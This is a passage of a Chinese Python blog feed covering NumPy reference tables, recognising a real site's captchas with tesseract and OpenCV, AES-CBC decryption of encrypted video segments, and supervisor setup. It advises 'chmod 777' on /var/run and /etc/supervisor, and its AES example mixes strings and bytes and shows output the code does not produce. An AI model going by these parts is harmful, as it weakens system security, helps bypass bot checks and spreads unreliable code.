class="line">np.prod([2.,3.]) # 6</span><br><span class="line">np.prod([[1.,2.],[3.,4.]], axis&#x3D;0) # array([3., 8.])</span><br><span class="line">np.prod([[1.,2.],[3.,4.]], axis&#x3D;1) # array([ 2., 12.])</span><br><span class="line">np.diff([0, 2, 4, 7, 0]) # array([ 2,  2,  3, -7])</span><br><span class="line">np.diff([[1, 3, 6, 10], [0, 5, 6, 8]]) # array([[2, 3, 4],[5, 1, 2]])</span><br><span class="line">np.diff([[1, 3, 6, 10], [0, 5, 6, 8]], axis&#x3D;0) # array([[-1,  2,  0, -2]])</span><br><span class="line">a &#x3D; np.array([[1,2,3], [4,5,6]])</span><br><span class="line">np.cumsum(a) # array([ 1,  3,  6, 10, 15, 21], dtype&#x3D;int32)</span><br></pre></td></tr></table></figure><h2 id="指数操作"><a class="markdownIt-Anchor" href="#指数操作"></a> 指数操作</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>exp(x, /[, out, where, casting, order, …])</td><td>Calculate the exponential of all elements in the input array.</td></tr><tr><td>log(x, /[, out, where, casting, order, …])</td><td>Natural logarithm, element-wise</td></tr><tr><td>log10(x, /[, out, where, casting, order, …])</td><td>Return the base 10 logarithm of the input array, element-wise.</td></tr><tr><td>log2(x, /[, out, where, casting, order, …])</td><td>Base-2 logarithm of x</td></tr></tbody></table><h2 id="统计函数"><a class="markdownIt-Anchor" href="#统计函数"></a> 统计函数</h2><h3 id="averages-and-variances"><a class="markdownIt-Anchor" href="#averages-and-variances"></a> Averages and variances</h3><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>median(a[, axis, out, overwrite_input, keepdims])</td><td>Compute the median (中位数) along the specified axis.如果数据的个数是奇数，则中间那个数据就是这群数据的中位数；如果数据的个数是偶数，则中间那2个数据的算术平均值就是这群数据的中位数。</td></tr><tr><td>average(a[, axis, weights, returned])</td><td>Compute the weighted average （加权平均值）along the specified axis. np.average(np.array([1,2,3,4]), weights=np.array([1,2,3,4]))</td></tr><tr><td>mean(a[, axis, dtype, out, keepdims])</td><td>Compute the arithmetic mean (算术平均值) along the specified axis.</td></tr><tr><td>std(a[, axis, dtype, out, ddof, keepdims])</td><td>Compute the standard deviation （标准差）along the specified axis.</td></tr><tr><td>var(a[, axis, dtype, out, ddof, keepdims])</td><td>Compute the variance （方差）along the specified axis.</td></tr><tr><td>nanmedian(a[, axis, out, overwrite_input, …])</td><td>Compute the median along the specified axis, while ignoring NaNs.</td></tr><tr><td>nanmean(a[, axis, dtype, out, keepdims])</td><td>Compute the arithmetic mean along the specified axis, ignoring NaNs.</td></tr><tr><td>nanstd(a[, axis, dtype, out, ddof, keepdims])</td><td>Compute the standard deviation along the specified axis, while ignoring NaNs.</td></tr><tr><td>nanvar(a[, axis, dtype, out, ddof, keepdims])</td><td>Compute the variance along the specified axis, while ignoring NaNs.</td></tr></tbody></table><h3 id="order-statistics"><a class="markdownIt-Anchor" href="#order-statistics"></a> Order statistics</h3><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>amin(a[, axis, out, keepdims, initial, where])</td><td>Return the minimum of an array or minimum along an axis.</td></tr><tr><td>amax(a[, axis, out, keepdims, initial, where])</td><td>Return the maximum of an array or maximum along an axis.</td></tr><tr><td>nanmin(a[, axis, out, keepdims])</td><td>Return minimum of an array or minimum along an axis, ignoring any NaNs.</td></tr><tr><td>nanmax(a[, axis, out, keepdims])</td><td>Return the maximum of an array or maximum along an axis, ignoring any NaNs.</td></tr><tr><td>ptp(a[, axis, out, keepdims])</td><td>Range of values (maximum - minimum) along an axis.返回最大值-最小值，用于归一化</td></tr><tr><td>percentile(a, q[, axis, out, …])</td><td>Compute the q-th percentile of the data along the specified axis.一组n个观测值按数值大小排列。处于p%位置的值称第p百分位数。 如果p = 50，此函数与中位数相同；如果p = 0，则与最小值相同；如果p = 100，则与最大值相同。</td></tr><tr><td>nanpercentile(a, q[, axis, out, …])</td><td>Compute the qth percentile of the data along the specified axis, while ignoring nan values.</td></tr><tr><td>quantile(a, q[, axis, out, overwrite_input, …])</td><td>Compute the q-th quantile of the data along the specified axis.</td></tr><tr><td>nanquantile(a, q[, axis, out, …])</td><td>Compute the qth quantile of the data along the specified axis, while ignoring nan values.</td></tr></tbody></table><h3 id="correlating"><a class="markdownIt-Anchor" href="#correlating"></a> Correlating</h3><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>corrcoef(x[, y, rowvar, bias, ddof])</td><td>Return Pearson product-moment correlation coefficients.相关系数，得到归一化的相关矩阵</td></tr><tr><td>correlate(a, v[, mode])</td><td>Cross-correlation of two 1-dimensional sequences. 互相关，计算方法固定a，移动v，计算他们重合部分的累加积，取最大值。mode:same完全和错一位 valid完全重叠 full所有情况</td></tr><tr><td>cov(m[, y, rowvar, bias, ddof, fweights, …])</td><td>Estimate a covariance matrix, given data and weights.</td></tr></tbody></table><h3 id="histograms"><a class="markdownIt-Anchor" href="#histograms"></a> Histograms</h3><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>histogram(a[, bins=np.arange(10), range, normed, weights, density=False, …])</td><td>Compute the histogram of a set of data. density:false返回统计数量，true返回归一化的值</td></tr><tr><td>histogram2d(x, y[, bins, range, normed, …])</td><td>Compute the bi-dimensional histogram of two data samples.</td></tr><tr><td>histogramdd(sample[, bins, range, normed, …])</td><td>Compute the multidimensional histogram of some data.</td></tr><tr><td>bincount(x[, weights, minlength])</td><td>Count number of occurrences of each value in array of non-negative ints.</td></tr><tr><td>histogram_bin_edges(a[, bins, range, weights])</td><td>Function to calculate only the edges of the bins used by the histogram function.</td></tr><tr><td>digitize(x, bins[, right=False])</td><td>Return the indices of the bins to which each value in input array belongs.将数值，根据区间bin，right是否包含最右，生成对应区间索引</td></tr></tbody></table><h2 id="排序函数"><a class="markdownIt-Anchor" href="#排序函数"></a> 排序函数</h2><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>sort(a[, axis, kind, order])</td><td>Return a sorted copy of an array.axis默认是按照最后一个轴排序，order是根据某个字段排序</td></tr><tr><td>lexsort(keys[, axis])</td><td>Perform an indirect stable sort using a sequence of keys.</td></tr><tr><td>argsort(a[, axis, kind, order])</td><td>Returns the indices that would sort an array. 返回排序后的索引数组</td></tr><tr><td>ndarray.sort([axis, kind, order])</td><td>Sort an array in-place.</td></tr><tr><td>msort(a)</td><td>Return a copy of an array sorted along the first axis.</td></tr><tr><td>sort_complex(a)</td><td>Sort a complex array using the real part first, then the imaginary part.</td></tr><tr><td>partition(a, kth[, axis, kind, order])</td><td>Return a partitioned copy of an array.</td></tr><tr><td>argpartition(a, kth[, axis, kind, order])</td><td>Perform an indirect partition along the given axis using the algorithm specified by the kind keyword.</td></tr></tbody></table><h2 id="条件查找"><a class="markdownIt-Anchor" href="#条件查找"></a> 条件查找</h2><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>argmax(a[, axis, out])</td><td>Returns the indices of the maximum values along an axis.</td></tr><tr><td>nanargmax(a[, axis])</td><td>Return the indices of the maximum values in the specified axis ignoring NaNs.</td></tr><tr><td>argmin(a[, axis, out])</td><td>Returns the indices of the minimum values along an axis.</td></tr><tr><td>nanargmin(a[, axis])</td><td>Return the indices of the minimum values in the specified axis ignoring NaNs.</td></tr><tr><td>argwhere(a)</td><td>Find the indices of array elements that are non-zero, grouped by element.</td></tr><tr><td>nonzero(a)</td><td>Return the indices of the elements that are non-zero.</td></tr><tr><td>flatnonzero(a)</td><td>Return indices that are non-zero in the flattened version of a.</td></tr><tr><td>where(condition, [x, y])</td><td>Return elements chosen from x or y depending on condition. np.where(a &lt; 5, a, 10*a)</td></tr><tr><td>searchsorted(a, v[, side, sorter])</td><td>Find indices where elements should be inserted to maintain order.a是排好序的数组，在a中检索v所处的位置，默认从左开始检索，side=left左开右闭，side=right左闭右开。可以用于按照比例的随机选择：<code>a[np.searchsorted(np.r_[np.linspace(0,0.5,num=50),np.linspace(0.5,0.75,num=50),np.linspace(0.75,1,num=50)],np.random.random(150))]</code></td></tr><tr><td>extract(condition, arr)</td><td>Return the elements of an array that satisfy some condition.</td></tr></tbody></table><h2 id="随机数"><a class="markdownIt-Anchor" href="#随机数"></a> 随机数</h2><h3 id="产生随机数的种子"><a class="markdownIt-Anchor" href="#产生随机数的种子"></a> 产生随机数的种子</h3><ul><li>NumPy伪随机数生成器与Python标准库伪随机数生成器不同。Python伪随机数生成器提供的种子不会影响NumPy伪随机数生成器。 两者必须单独提供种子并单独使用。</li><li>seed()函数可用于以整数作为种子值来为NumPy伪随机数生成器提供种子。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> seed</span><br><span class="line"><span class="keyword">from</span> numpy.random <span class="keyword">import</span> rand</span><br><span class="line"><span class="comment"># seed random number generator</span></span><br><span class="line">seed(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># generate some random numbers</span></span><br><span class="line">print(rand(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="随机数的生成"><a class="markdownIt-Anchor" href="#随机数的生成"></a> 随机数的生成</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>随机浮点值数组</td><td><code>values = rand(10)</code></td></tr><tr><td>随机整数值数组</td><td><code>values = randint(0, 10, 20)</code></td></tr><tr><td>随机高斯值数组</td><td><code>values = randn(10)</code></td></tr><tr><td>随机洗牌数组</td><td><code># prepare a sequence;</code><br><code>sequence = [i for i in range(20)];</code><br><code>print(sequence);</code><br><code># randomly shuffle the sequence;</code><br><code>shuffle(sequence)</code><br><code>print(sequence)</code></td></tr><tr><td>数组中选择一个随机样本</td><td><code>np.random.choice(array_0_to_99, size = 5,replace=True,p=[.1,.2,.3,.4,.5])</code>replace表示选择可以重复;随机选取size个数;p表示对应列的概率</td></tr><tr><td>产生总和为1的随机数</td><td><code>list_of_random_floats = np.random.random(100)</code><br><code>sum_of_values = list_of_random_floats.sum()</code><br><code>print(sum_of_values)</code><br><code>normalized_values = list_of_random_floats / sum_of_values</code><br><code>print(normalized_values.sum())</code></td></tr></tbody></table><h2 id="字节交换"><a class="markdownIt-Anchor" href="#字节交换"></a> 字节交换</h2><h3 id="ndarraybyteswap"><a class="markdownIt-Anchor" href="#ndarraybyteswap"></a> ndarray.byteswap()</h3><ul><li><code>numpy.ndarray.byteswap()</code>函数在两种表示形式之间切换：big-endian和little-endian。</li><li><code>print(a.byteswap(True))</code></li></ul><h2 id="线型代数nplinalg"><a class="markdownIt-Anchor" href="#线型代数nplinalg"></a> 线型代数np.linalg</h2><table><thead><tr><th>方法</th><th>函数</th></tr></thead><tbody><tr><td>转置</td><td>a.transpose()</td></tr><tr><td>求逆</td><td>np.linalg.inv(a)</td></tr><tr><td>矩阵乘积</td><td>u @ v</td></tr><tr><td>求迹</td><td>np.trace(u)</td></tr><tr><td>求线性方程的解</td><td>np.linalg.solve(a, b)</td></tr><tr><td>求特征值和特征向量</td><td>w, v = np.linalg.eig(v)</td></tr><tr><td>奇异值分解</td><td>Q,S,VT=np.linalg.svd(v) # 当求解一个非方阵的奇异值之前，需要先把这个矩阵转换为方阵。<code>A = np.mat([[1,2,3],[4,5,6]]);U = A*A.T;lamda,hU=np.linalg.eig(U);sigma=np.sqrt(lamda)</code></td></tr><tr><td>内积</td><td>dot()</td></tr><tr><td>普通的內积</td><td>inner()</td></tr><tr><td>数组下标的数量</td><td>np.rank(A) # 求矩阵的秩要使用<code>linalg.matrix_rank</code></td></tr><tr><td>点积 （dot product）</td><td>ans = np.dot(A,b)</td></tr></tbody></table><h2 id="数据文件读写"><a class="markdownIt-Anchor" href="#数据文件读写"></a> 数据文件读写</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>load()和save()</td><td>函数处理numPy二进制文件（扩展名为npy）</td></tr><tr><td>loadtxt()和savetxt()</td><td>函数处理普通文本文件<code>np.savetxt(&quot;files/test3.txt&quot;, x, fmt=&quot;%04d&quot;, delimiter=&quot; :-) , usecols=(0,2)&quot;)</code></td></tr><tr><td>A.tofile(fid, sep=&quot;&quot;, format=&quot;%s&quot;)numpy.fromfile(file, dtype=float, count=-1, sep=’’)</td><td>将数组内容以二进制（默认值）和文本格式写入文件的功能。</td></tr><tr><td>np.genfromtxt(filename, delimiter=&quot;,&quot;, dtype=None)</td><td>可以处理存档格式gzip和bzip2。 归档文件的类型取决于文件的扩展名，即gzip为.gz，bzip2为bz2。</td></tr><tr><td>recfromcsv(fname, **kwargs)</td><td>是np.genfromtxt的简写</td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tesseract识别验证码</title>
      <link href="/2020/08/10/tesseract%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
      <url>/2020/08/10/tesseract%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>识别验证码</p></blockquote><a id="more"></a><h1 id="使用tesseract-ocr"><a class="markdownIt-Anchor" href="#使用tesseract-ocr"></a> 使用tesseract-ocr</h1><ul><li><p>安装tesseract软件，<a href="https://github.com/UB-Mannheim/tesseract/wiki">下载地址</a></p></li><li><p>安装完毕后要将tesseract.exe路径添加到环境变量中，在cmd中输入<code>tesseract --version</code>测试安装是否成功</p></li><li><p>使用<code>subprocess.Popen</code>调用tesseract软件</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">img = Image.open(filename)</span><br><span class="line">img = img.convert(<span class="string">&#x27;RGB&#x27;</span>) <span class="comment"># 更改为RGB模式</span></span><br><span class="line">img = img.point(<span class="keyword">lambda</span> x: <span class="number">0</span> <span class="keyword">if</span> x &lt; <span class="number">143</span> <span class="keyword">else</span> <span class="number">255</span>) <span class="comment"># 二值化图像</span></span><br><span class="line">borderImg = ImageOps.expand(img, <span class="number">10</span>, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">borderImg.save(filename)</span><br><span class="line"><span class="comment"># 通过subprocess在当前py运行的进程中开启另外一个线程运行tesseract，并且当前线程暂停等待tesseract线程完成识别工作并将识别结果保存到captcha.txt中。</span></span><br><span class="line">p = subprocess.Popen([<span class="string">&#x27;tesseract&#x27;</span>, <span class="string">&#x27;captcha.jpg&#x27;</span>, <span class="string">&#x27;captcha&#x27;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">p.wait()</span><br><span class="line"><span class="comment"># 读取解析结果</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;captcha.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> reader:</span><br><span class="line">    catchacode = reader.read().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;验证码为：&#x27;</span>, catchacode)</span><br></pre></td></tr></table></figure><h1 id="使用pytesseract"><a class="markdownIt-Anchor" href="#使用pytesseract"></a> 使用pytesseract</h1><ul><li>安装环境</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pillow</span><br><span class="line">pip install pytesseract</span><br></pre></td></tr></table></figure><ul><li><p>安装tesseract软件，<a href="https://github.com/UB-Mannheim/tesseract/wiki">下载地址</a>，并配置环境变量</p></li><li><p><a href="http://xn--pythonpytesseractpytesseract-f738b9x4ams8cdk3aca775xuqh2r9c3y3idadm7862qga3597c5s9aus4c.py">在python的安装路径下的修改安装的pytesseract库里面的pytesseract.py</a>，将默认的改成Tesseract-OCR的安装路径</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tesseract_cmd=<span class="string">r&#x27;tesseract&#x27;</span> <span class="comment">#如果路径正确，可以不用更改</span></span><br><span class="line">tesseract_cmd=<span class="string">r&#x27;path/tesseract.exe&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>识别图片</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">img = Image.open(filename)</span><br><span class="line">img = img.convert(<span class="string">&#x27;RGB&#x27;</span>) <span class="comment"># 更改为RGB模式</span></span><br><span class="line">text = pytesseract.image_to_string(img,lang=<span class="string">&#x27;eng&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="读取二进制图片"><a class="markdownIt-Anchor" href="#读取二进制图片"></a> 读取二进制图片</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例代码</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">content = requests.get(<span class="string">&quot;http://my.cnki.net/Register/CheckCode.aspx?id=1563416120154&quot;</span>).content</span><br><span class="line">image = Image.frombytes(mode=<span class="string">&quot;RGBA&quot;</span>,size=(<span class="number">64</span>,<span class="number">25</span>),data=content,decoder_name=<span class="string">&quot;raw&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>抛出异常：<code>ValueError: not enough image data</code></li><li>原因：图片为jpg格式，包括了图片的原始（jpg压缩后的）数据和（jpg）文件头，而frombytes只能读取纯二进制数据</li><li>解决方法一</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO,BytesIO</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">content = requests.get(<span class="string">&quot;http://my.cnki.net/Register/CheckCode.aspx?id=1563416120154&quot;</span>).content</span><br><span class="line">image = Image.open(BytesIO(content))</span><br></pre></td></tr></table></figure><ul><li>解决方法二:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imgByteArr = BytesIO()</span><br><span class="line">image.save(imgByteArr,format=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">imgByteArr.getvalue()</span><br></pre></td></tr></table></figure><h1 id="tesseract提高识别率"><a class="markdownIt-Anchor" href="#tesseract提高识别率"></a> tesseract提高识别率</h1><h2 id="下载识别语言训练数据"><a class="markdownIt-Anchor" href="#下载识别语言训练数据"></a> 下载识别语言训练数据</h2><ul><li><a href="https://github.com/tesseract-ocr/tessdata">下载地址</a></li></ul><h2 id="修改图片的灰度"><a class="markdownIt-Anchor" href="#修改图片的灰度"></a> 修改图片的灰度</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageEnhance</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">img = Image.open(<span class="string">&#x27;sanyecao.jpg&#x27;</span>)</span><br><span class="line">img = img.convert(<span class="string">&#x27;RGB&#x27;</span>)  <span class="comment">#这里也可以尝试使用L</span></span><br><span class="line">enhancer = ImageEnhance.Color(img)</span><br><span class="line">enhancer = enhancer.enhance(<span class="number">0</span>)</span><br><span class="line">enhancer = ImageEnhance.Brightness(enhancer)</span><br><span class="line">enhancer = enhancer.enhance(<span class="number">2</span>)</span><br><span class="line">enhancer = ImageEnhance.Contrast(enhancer)</span><br><span class="line">enhancer = enhancer.enhance(<span class="number">8</span>)</span><br><span class="line">enhancer = ImageEnhance.Sharpness(enhancer)</span><br><span class="line">img = enhancer.enhance(<span class="number">20</span>)</span><br><span class="line">text=pytesseract.image_to_string(img)</span><br></pre></td></tr></table></figure><h2 id="闭操作去除噪点"><a class="markdownIt-Anchor" href="#闭操作去除噪点"></a> 闭操作，去除噪点</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">img = cv2.imdecode(np.frombuffer(ret.content, np.uint8), cv2.IMREAD_COLOR)</span><br><span class="line">cv2.imshow(<span class="string">&quot;source&quot;</span>, img)</span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">res, binary = cv2.threshold(gray, <span class="number">0</span>, <span class="number">255</span>, cv2.THRESH_BINARY | cv2.THRESH_OTSU)</span><br><span class="line">cv2.imshow(<span class="string">&quot;binary&quot;</span>, binary)</span><br><span class="line">kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">binary = cv2.morphologyEx(binary, cv2.MORPH_CLOSE, kernel)</span><br><span class="line">cv2.imshow(<span class="string">&quot;close result&quot;</span>, binary)</span><br><span class="line">image = Image.fromarray(cv2.cvtColor(binary, cv2.COLOR_GRAY2RGB))</span><br><span class="line">code = pytesseract.image_to_string(img)</span><br></pre></td></tr></table></figure><h1 id="opencv转pillow"><a class="markdownIt-Anchor" href="#opencv转pillow"></a> opencv转pillow</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">img = cv2.imdecode(np.frombuffer(ret.content, np.uint8), cv2.IMREAD_COLOR)</span><br><span class="line">cv2.imshow(<span class="string">&quot;source&quot;</span>, img)</span><br><span class="line">image = Image.fromarray(cv2.cvtColor(binary, cv2.COLOR_GRAY2RGB))</span><br><span class="line">code = pytesseract.image_to_string(img)</span><br></pre></td></tr></table></figure><h1 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h1><h2 id="from-import-_imaging-as-core-importerror-dll-load-failed-找不到指定的模块"><a class="markdownIt-Anchor" href="#from-import-_imaging-as-core-importerror-dll-load-failed-找不到指定的模块"></a> from . import _imaging as core ImportError: DLL load failed: 找不到指定的模块</h2><ul><li>卸载pillow，重新安装</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip uninstall pillow</span><br><span class="line">pip install pillow</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts文件解密</title>
      <link href="/2020/08/07/ts%E6%96%87%E4%BB%B6%E8%A7%A3%E5%AF%86/"/>
      <url>/2020/08/07/ts%E6%96%87%E4%BB%B6%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>通过m3u8下载视频文件，下载完成后无法播放。查看m3u8文件，发现视频文件被加密，所以直接下载后不能直接播放。</p></blockquote><a id="more"></a><h1 id="ts文件加密方式"><a class="markdownIt-Anchor" href="#ts文件加密方式"></a> ts文件加密方式</h1><table><thead><tr><th>AES加密方式</th><th></th></tr></thead><tbody><tr><td>ECB</td><td>Electronic CodeBook，电子密码本模式</td></tr><tr><td>CBC</td><td>Cipher-block chaining，密码块连接模式</td></tr><tr><td>PCBC</td><td>Propagating cipher-block chaining，填充密码块链接模式</td></tr><tr><td>CTR</td><td>Counter mode，计数器模式</td></tr><tr><td>CFB</td><td>Cipher feedback，密文反馈模式</td></tr><tr><td>OFB</td><td>Output feedback，输出反馈模式</td></tr></tbody></table><ul><li><a href="https://blog.csdn.net/u013073067/article/details/87086562">加密方式详细介绍</a></li></ul><h1 id="python实现加密算法"><a class="markdownIt-Anchor" href="#python实现加密算法"></a> python实现加密算法</h1><ul><li>安装环境</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line">pip install pycryptodome </span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line">pip install pycrypto </span><br></pre></td></tr></table></figure><h2 id="cbc"><a class="markdownIt-Anchor" href="#cbc"></a> CBC</h2><ul><li>cbc模式使用了AES-128加密，需要一个十六位的key(密钥)和一个十六位iv(偏移量)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESUtil</span>:</span></span><br><span class="line">    __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryt</span>(<span class="params">data, key, iv=None</span>):</span></span><br><span class="line">        bs = AES.block_size</span><br><span class="line">        pad = <span class="keyword">lambda</span> s: s + ((bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> iv:</span><br><span class="line">            iv = Random.new().read(bs)</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        data = cipher.encrypt(pad(data))</span><br><span class="line">        data = iv + data</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data, key, iv=None</span>):</span></span><br><span class="line">        bs = AES.block_size</span><br><span class="line">        <span class="keyword">if</span> len(data) &lt;= bs:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="comment">#unpad = lambda s : s[0:-ord(s[-1])]</span></span><br><span class="line">        unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-(s[<span class="number">-1</span>])]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> iv:</span><br><span class="line">            iv = data[:bs]</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        data  = unpad(cipher.decrypt(data[bs:]))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">&quot;1234567812345678&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;1234567812345678&quot;</span></span><br><span class="line">    res = AESUtil.encryt(<span class="string">&quot;123456&quot;</span>, key, iv)</span><br><span class="line">    print(res) <span class="comment"># 2eDiseYiSX62qk/WS/ZDmg==</span></span><br><span class="line">    print(AESUtil.decrypt(res, key, iv)) <span class="comment"># 123456</span></span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>supervisor</title>
      <link href="/2020/08/03/supervisor/"/>
      <url>/2020/08/03/supervisor/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>supervisor简单使用</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><ul><li><p>Supervisor是一个用Python2写的进程管理工具，可以很方便的对进程进行启动、停止、重启等操作。</p></li><li><p><a href="http://supervisord.org/">官方网址</a></p></li></ul><h1 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h1><ul><li>安装成功后，supervisor就会默认启动，在/etc/supervisor目录下，生成supervisord.conf配置文件。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install supervisor</span><br></pre></td></tr></table></figure><ul><li>需要注意的是，如果不是root账号，需要对这些目录进行权限设置，要不然会报一些错误（一定要在 root 账号下进行配置）。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod 777 /var/run</span><br><span class="line">sudo chmod 777 /etc/supervisor</span><br></pre></td></tr></table></figure><ul><li>接着就可以启动 Supervisord 了：</li></ul><figure class="highlight bash"><table><tr><td 